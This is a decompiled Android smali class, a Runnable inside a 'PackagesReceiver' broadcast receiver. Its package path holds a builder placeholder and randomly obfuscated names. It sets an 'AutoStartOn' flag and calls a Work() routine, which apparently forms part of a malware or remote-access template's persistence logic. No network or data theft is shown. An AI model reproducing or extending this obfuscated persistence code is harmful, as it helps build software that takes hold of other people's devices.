.class L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/ajfzohvjgwjouuagessauzaxzxmirruovuzkddzvvswwcyyfte5/PackagesReceiver$1;
.super Ljava/lang/Object;
.source "PackagesReceiver.java"

# interfaces
.implements Ljava/lang/Runnable;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/ajfzohvjgwjouuagessauzaxzxmirruovuzkddzvvswwcyyfte5/PackagesReceiver;->onReceive(Landroid/content/Context;Landroid/content/Intent;)V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic this$0:L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/ajfzohvjgwjouuagessauzaxzxmirruovuzkddzvvswwcyyfte5/PackagesReceiver;

.field final synthetic val$mContext:Landroid/content/Context;


# direct methods
.method constructor <init>(L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/ajfzohvjgwjouuagessauzaxzxmirruovuzkddzvvswwcyyfte5/PackagesReceiver;Landroid/content/Context;)V
    .locals 0
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "()V"
        }
    .end annotation

    .line 83
    iput-object p1, p0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/ajfzohvjgwjouuagessauzaxzxmirruovuzkddzvvswwcyyfte5/PackagesReceiver$1;->this$0:L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/ajfzohvjgwjouuagessauzaxzxmirruovuzkddzvvswwcyyfte5/PackagesReceiver;

    iput-object p2, p0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/ajfzohvjgwjouuagessauzaxzxmirruovuzkddzvvswwcyyfte5/PackagesReceiver$1;->val$mContext:Landroid/content/Context;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public run()V
    .locals 3

    .line 85
    invoke-static {}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/ymohvcbrknsnxeoujrdhblrwadynhwynfqzklncagrzgjnbnxk4/utilities;->NeedAutoStart()Z

    move-result v0

    if-eqz v0, :cond_0

    iget-object v0, p0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/ajfzohvjgwjouuagessauzaxzxmirruovuzkddzvvswwcyyfte5/PackagesReceiver$1;->val$mContext:Landroid/content/Context;

    sget-object v1, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/MySettings;->AutoStartOn:Ljava/lang/String;

    const/4 v2, 0x0

    invoke-static {v2}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v2

    invoke-static {v0, v1, v2}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/MySettings;->readBool(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Boolean;)Z

    move-result v0

    if-nez v0, :cond_0

    .line 87
    iget-object v0, p0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/ajfzohvjgwjouuagessauzaxzxmirruovuzkddzvvswwcyyfte5/PackagesReceiver$1;->val$mContext:Landroid/content/Context;

    sget-object v1, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/MySettings;->AutoStartOn:Ljava/lang/String;

    const/4 v2, 0x1

    invoke-static {v2}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v2

    invoke-static {v0, v1, v2}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/MySettings;->WriteBool(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Boolean;)V

    .line 90
    :cond_0
    iget-object v0, p0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/ajfzohvjgwjouuagessauzaxzxmirruovuzkddzvvswwcyyfte5/PackagesReceiver$1;->val$mContext:Landroid/content/Context;

    invoke-static {v0}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/ajfzohvjgwjouuagessauzaxzxmirruovuzkddzvvswwcyyfte5/PackagesReceiver;->Work(Landroid/content/Context;)V

    return-void
.end method
